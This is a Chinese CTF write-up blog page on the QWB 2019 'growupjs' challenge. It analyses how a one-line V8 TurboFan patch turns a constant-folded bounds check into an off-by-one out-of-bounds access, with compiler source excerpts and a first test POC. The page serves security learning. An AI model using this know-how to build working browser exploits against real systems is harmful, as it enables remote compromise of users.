@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="由于Patch的改动导致了Off-by-one，通过它实现一个完整的OOB利用。">
+<meta name="keywords" content="exploit,Browser">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QWB CTF 2019 growupjs">
+<meta property="og:url" content="http://yoursite.com/2020/05/17/QWB-CTF-2019-growupjs/index.html">
+<meta property="og:site_name" content="cd &#x2F;pwn">
+<meta property="og:description" content="由于Patch的改动导致了Off-by-one，通过它实现一个完整的OOB利用。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/05/17/QWB-CTF-2019-growupjs/001.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/17/QWB-CTF-2019-growupjs/002.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/17/QWB-CTF-2019-growupjs/003.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/17/QWB-CTF-2019-growupjs/004.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/17/QWB-CTF-2019-growupjs/005.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/17/QWB-CTF-2019-growupjs/006.png">
+<meta property="og:updated_time" content="2020-05-18T13:03:17.847Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="QWB CTF 2019 growupjs">
+<meta name="twitter:description" content="由于Patch的改动导致了Off-by-one，通过它实现一个完整的OOB利用。">
+<meta name="twitter:image" content="http://yoursite.com/2020/05/17/QWB-CTF-2019-growupjs/001.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/05/17/QWB-CTF-2019-growupjs/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>QWB CTF 2019 growupjs | cd /pwn</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cd /pwn</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/17/QWB-CTF-2019-growupjs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Eros John">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cd /pwn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">QWB CTF 2019 growupjs
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-05-17 21:14:58" itemprop="dateCreated datePublished" datetime="2020-05-17T21:14:58+08:00">2020-05-17</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-05-18 21:03:17" itemprop="dateModified" datetime="2020-05-18T21:03:17+08:00">2020-05-18</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Browser/" itemprop="url" rel="index"><span itemprop="name">Browser</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Browser/v8/" itemprop="url" rel="index"><span itemprop="name">v8</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>由于Patch的改动导致了Off-by-one，通过它实现一个完整的OOB利用。</p>
+<a id="more"></a>
+<hr>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code>$ cat challenge.diff
+</code></pre><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc</span><br><span class="line">index a6a8e87cf4..164ab44fab 100644</span><br><span class="line"><span class="comment">--- a/src/compiler/machine-operator-reducer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/machine-operator-reducer.cc</span></span><br><span class="line">@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) &#123;</span><br><span class="line">       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M &lt; x =&gt; false</span><br><span class="line">       if (m.right().Is(0)) return ReplaceBool(false);          // x &lt; 0 =&gt; false</span><br><span class="line">       if (m.IsFoldable()) &#123;                                    // K &lt; K =&gt; K</span><br><span class="line"><span class="deletion">-        return ReplaceBool(m.left().Value() &lt; m.right().Value());</span></span><br><span class="line"><span class="addition">+        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);</span></span><br><span class="line">       &#125;</span><br><span class="line">       if (m.LeftEqualsRight()) return ReplaceBool(false);  // x &lt; x =&gt; false</span><br><span class="line">       if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br></pre></td></tr></table></figure>
+<pre><code>$ git apply ./challenge.diff
+</code></pre><p>比赛当时使用的是最新的Chrome，我这里使用的v8与其环境不同，在wasmInstance到rwxAddrLoc的偏移有所差距。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc</span><br><span class="line">index a6a8e87cf4..164ab44fab 100644</span><br><span class="line"><span class="comment">--- a/src/compiler/machine-operator-reducer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/machine-operator-reducer.cc</span></span><br><span class="line">@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) &#123;</span><br><span class="line">       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M &lt; x =&gt; false</span><br><span class="line">       if (m.right().Is(0)) return ReplaceBool(false);          // x &lt; 0 =&gt; false</span><br><span class="line">       if (m.IsFoldable()) &#123;                                    // K &lt; K =&gt; K</span><br><span class="line"><span class="deletion">-        return ReplaceBool(m.left().Value() &lt; m.right().Value());</span></span><br><span class="line"><span class="addition">+        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);</span></span><br><span class="line">       &#125;</span><br><span class="line">       if (m.LeftEqualsRight()) return ReplaceBool(false);  // x &lt; x =&gt; false</span><br><span class="line">       if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br></pre></td></tr></table></figure>
+<p>该Patch只增加了两个字符，其作用于MachineOperatorReducer，是TurboFan优化的较晚阶段。<br>在其过程中被优化为左值&lt;右值这个表达式，一个永真或永假的值。编译器会尝试把确定性的比较操作直接优化为一个布尔常量。<br>例如对于任意的<code>x</code>，<code>kMaxUInt32 &lt; x</code>被折叠为<code>False</code>，对于常数之间<code>4 &lt; 4</code>也会被折叠为<code>False</code>。<br>而由于Patch的引入，右数被加了一，原本<code>4 &lt; 4</code>变成了<code>4 &lt; 5</code>，被错误折叠为<code>Ture</code>。</p>
+<h2 id="CheckBound优化流程"><a href="#CheckBound优化流程" class="headerlink" title="CheckBound优化流程"></a>CheckBound优化流程</h2><p>在这里我们有必要了解一下CheckBound优化流程。<br>在<code>simplified-lowering</code>阶段，<code>[1]</code>处<code>CheckBound</code>节点设置<code>kAbortOnOutOfBounds</code>模式并在<code>[2]</code>处被设置为<code>CheckedUint32Bounds</code>。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    CheckParameters <span class="keyword">const</span>&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">    Type <span class="keyword">const</span> index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type <span class="keyword">const</span> length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (length_type.Is(Type::Unsigned31())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">        <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">        <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">        <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">        VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                   MachineRepresentation::kWord32);</span><br><span class="line">        <span class="keyword">if</span> (lower()) &#123;</span><br><span class="line">          CheckBoundsParameters::Mode mode =</span><br><span class="line">              CheckBoundsParameters::kDeoptOnOutOfBounds;</span><br><span class="line">          <span class="keyword">if</span> (lowering-&gt;poisoning_level_ ==</span><br><span class="line">                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">            <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">            <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">            mode = CheckBoundsParameters::kAbortOnOutOfBounds;         <span class="comment">// [1]</span></span><br><span class="line">          &#125;</span><br><span class="line">          NodeProperties::ChangeOp(</span><br><span class="line">              node, simplified()-&gt;CheckedUint32Bounds(p.feedback(), mode)); <span class="comment">// [2]</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p>在<code>Effect linearization</code>阶段，<code>CheckedUint32Bounds</code>节点会被优化成<code>Uint32LessThan</code>节点，并绑定上其<code>True</code>和<code>False</code>分支。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Node* EffectControlLinearizer::LowerCheckedUint32Bounds(Node* node,</span><br><span class="line">                                                        Node* frame_state) &#123;</span><br><span class="line">  Node* index = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">  Node* limit = node-&gt;InputAt(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">const</span> CheckBoundsParameters&amp; params = CheckBoundsParametersOf(node-&gt;op());</span><br><span class="line"></span><br><span class="line">  Node* check = __ Uint32LessThan(index, limit);</span><br><span class="line">  <span class="keyword">switch</span> (params.mode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> CheckBoundsParameters::kDeoptOnOutOfBounds:</span><br><span class="line">      __ DeoptimizeIfNot(DeoptimizeReason::kOutOfBounds,</span><br><span class="line">                         params.check_parameters().feedback(), check,</span><br><span class="line">                         frame_state, IsSafetyCheck::kCriticalSafetyCheck);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> CheckBoundsParameters::kAbortOnOutOfBounds: &#123;</span><br><span class="line">      <span class="keyword">auto</span> if_abort = __ MakeDeferredLabel();</span><br><span class="line">      <span class="keyword">auto</span> done = __ MakeLabel();</span><br><span class="line"></span><br><span class="line">      __ Branch(check, &amp;done, &amp;if_abort);</span><br><span class="line"></span><br><span class="line">      __ Bind(&amp;if_abort);</span><br><span class="line">      __ Unreachable();</span><br><span class="line">      __ Goto(&amp;done);</span><br><span class="line"></span><br><span class="line">      __ Bind(&amp;done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在<code>lateoptimize</code>阶段，则被优化为<code>左值 &lt; 右值</code>这个表达式，即一个<code>True</code>或者<code>False</code>条件。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Perform constant folding and strength reduction on machine operators.</span></span><br><span class="line">Reduction MachineOperatorReducer::Reduce(Node* node) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kUint32LessThan: &#123;</span><br><span class="line">      <span class="function">Uint32BinopMatcher <span class="title">m</span><span class="params">(node)</span></span>;</span><br><span class="line">      <span class="keyword">if</span> (m.left().Is(kMaxUInt32)) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);  <span class="comment">// M &lt; x =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.right().Is(<span class="number">0</span>)) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);          <span class="comment">// x &lt; 0 =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.IsFoldable()) &#123;                                    <span class="comment">// K &lt; K =&gt; K</span></span><br><span class="line">        <span class="keyword">return</span> ReplaceBool(m.left().Value() &lt; m.right().Value());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (m.LeftEqualsRight()) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);  <span class="comment">// x &lt; x =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br><span class="line">        <span class="function">Int32BinopMatcher <span class="title">mleft</span><span class="params">(m.left().node())</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (mleft.right().HasValue()) &#123;</span><br><span class="line">          <span class="comment">// (x &gt;&gt; K) &lt; C =&gt; x &lt; (C &lt;&lt; K)</span></span><br><span class="line">          <span class="comment">// when C &lt; (M &gt;&gt; K)</span></span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">uint32_t</span> c = m.right().Value();</span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">uint32_t</span> k = mleft.right().Value() &amp; <span class="number">0x1F</span>;</span><br><span class="line">          <span class="keyword">if</span> (c &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(kMaxInt &gt;&gt; k)) &#123;</span><br><span class="line">            node-&gt;ReplaceInput(<span class="number">0</span>, mleft.left().node());</span><br><span class="line">            node-&gt;ReplaceInput(<span class="number">1</span>, Uint32Constant(c &lt;&lt; k));</span><br><span class="line">            <span class="keyword">return</span> Changed(node);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// TODO(turbofan): else the comparison is always true.</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="虚假的POC"><a href="#虚假的POC" class="headerlink" title="虚假的POC"></a>虚假的POC</h3><p>测试POC如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    <span class="keyword">let</span> idx = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    opt()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = opt()</span><br><span class="line"><span class="built_in">console</span>.log(x)</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
+<p><code>~/browser/v8/out.gn/x64.release/d8 ./poc.js</code><br>运行后却并没有出现想象中的OOB，而是打印了<code>undefined</code></p>
+<p>我们通过<code>--trace-turbo</code>对优化过程的<code>IR</code>进行记录。<br><img src="/2020/05/17/QWB-CTF-2019-growupjs/001.png" alt="001"><br>可以看到在<code>loop peeling</code>阶段，其中34节点是比较，37节点是<code>LoadElement</code>，实际上就是执行<code>arr[idx]</code>。<br><img src="/2020/05/17/QWB-CTF-2019-growupjs/002.png" alt="002"><br>在<code>load elimination</code>阶段，上面所述的两个节点却被删除了。</p>
+<p>具体了解一下<code>load elimination</code>阶段做了什么。<br>以下部分内容以及相关思路来自<a href="https://xz.aliyun.com/t/5870#toc-2" target="_blank" rel="noopener">p4nda师傅的文章</a>。<br>首先以<code>AddReducer</code>方法添加了10个<code>reducer</code>，并在最后调用<code>graph_reducer.ReduceGraph()</code>。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LoadEliminationPhase</span> &#123;</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">"load elimination"</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    <span class="function">GraphReducer <span class="title">graph_reducer</span><span class="params">(temp_zone, data-&gt;graph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                               data-&gt;jsgraph()-&gt;Dead())</span></span>;</span><br><span class="line">    <span class="function">BranchElimination <span class="title">branch_condition_elimination</span><span class="params">(&amp;graph_reducer,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                   data-&gt;jsgraph(), temp_zone)</span></span>;</span><br><span class="line">    <span class="function">DeadCodeElimination <span class="title">dead_code_elimination</span><span class="params">(&amp;graph_reducer, data-&gt;graph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                              data-&gt;common(), temp_zone)</span></span>;</span><br><span class="line">    <span class="function">RedundancyElimination <span class="title">redundancy_elimination</span><span class="params">(&amp;graph_reducer, temp_zone)</span></span>;</span><br><span class="line">    <span class="function">LoadElimination <span class="title">load_elimination</span><span class="params">(&amp;graph_reducer, data-&gt;jsgraph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                     temp_zone)</span></span>;</span><br><span class="line">    <span class="function">CheckpointElimination <span class="title">checkpoint_elimination</span><span class="params">(&amp;graph_reducer)</span></span>;</span><br><span class="line">    <span class="function">ValueNumberingReducer <span class="title">value_numbering</span><span class="params">(temp_zone, data-&gt;graph()-&gt;zone())</span></span>;</span><br><span class="line">    <span class="function">CommonOperatorReducer <span class="title">common_reducer</span><span class="params">(&amp;graph_reducer, data-&gt;graph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                         data-&gt;broker(), data-&gt;common(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                         data-&gt;machine(), temp_zone)</span></span>;</span><br><span class="line">    <span class="function">TypedOptimization <span class="title">typed_optimization</span><span class="params">(&amp;graph_reducer, data-&gt;dependencies(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                         data-&gt;jsgraph(), data-&gt;broker())</span></span>;</span><br><span class="line">    <span class="function">ConstantFoldingReducer <span class="title">constant_folding_reducer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        &amp;graph_reducer, data-&gt;jsgraph(), data-&gt;broker())</span></span>;</span><br><span class="line">    <span class="function">TypeNarrowingReducer <span class="title">type_narrowing_reducer</span><span class="params">(&amp;graph_reducer, data-&gt;jsgraph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                                data-&gt;broker())</span></span>;</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;branch_condition_elimination);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;redundancy_elimination);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;load_elimination);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;type_narrowing_reducer);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;constant_folding_reducer);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;typed_optimization);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;checkpoint_elimination);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;common_reducer);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;value_numbering);</span><br><span class="line">    graph_reducer.ReduceGraph();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
